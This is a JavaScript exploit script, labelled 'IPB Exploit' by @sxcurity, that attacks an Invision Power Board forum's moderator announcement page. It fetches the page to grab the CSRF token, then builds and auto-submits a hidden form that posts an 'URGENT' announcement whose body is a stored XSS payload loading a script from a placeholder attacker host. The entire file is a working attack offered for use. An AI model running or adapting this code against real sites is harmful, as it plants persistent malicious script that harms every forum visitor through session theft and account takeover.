/*
 _
(_)_ ____      ___ __
| | '_ \ \ /\ / / '_ \
| | |_) \ V  V /| | | |
|_| .__/ \_/\_/ |_| |_|
 |_|  IPB Exploit
      by @sxcurity
*/

// specifies the target, the title of the announcement, and the xss payload!
var target = 'http://<target>/index.php?/modcp/announcements/&action=create';
var title = 'URGENT';

// Don't use quotes! It'll break our form down below!
var payload = '<script src=//<ATTACKER>/lol.js></script>';

// steals the csrf token ;)
var cdl = get(target);
document.body.innerHTML = cdl;
var form = document.getElementsByTagName('input')[3];
var token = form.value;

// DON'T EDIT!!
// Gets the current date! Thanks stackoverflow
var today = new Date();
var dd = today.getDate();
var mm = today.getMonth()+1; //January is 0!
var yyyy = today.getFullYear();
if(dd<10){
    dd='0'+dd;
}
if(mm<10){
    mm='0'+mm;
}
var today = mm+'/'+dd+'/'+yyyy;

// build form with valid token and evil credentials
document.body.innerHTML
  += '<form id="sxcurity" action="' + target + '" method="POST">'
	+ '<input type="hidden" name="_submitted" value="1">'
  + '<input type="hidden" name="csrfKey" value="' + token + '">'
	+ '<input type="hidden" name="MAX_FILE_SIZE" value="2097152">'
	+ '<input type="hidden" name="plupload" value="sxcurity">'
	+ '<input type="hidden" name="announce_title" value="' + title + '">'
	+ '<input type="hidden" name="announce_start" value="' + today +'">'
	+ '<input type="hidden" name="announce_end_unlimited" value="0">'
	+ '<input type="hidden" name="announce_content" value="'+ payload +'">'
	+ '<input type="hidden" name="announce_content_upload" value="sxcurity">'
	+ '<input type="hidden" name="announce_app_unlimited" value="*">'
	+ '<input type="hidden" name="announce_calendars">'
	+ '<input type="hidden" name="announce_calendars-zeroVal" value="on">'
	+ '<input type="hidden" name="announce_download_categories">'
	+ '<input type="hidden" name="announce_download_categories-zeroVal" value="on">'
	+ '<input type="hidden" name="announce_forums">'
	+ '<input type="hidden" name="announce_forums-zeroVal" value="on">'
  + '</form>';

// submits our csrf form!
document.forms["sxcurity"].submit();

function get(url) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", url, false);
    xmlHttp.send(null);
    return xmlHttp.responseText;
}
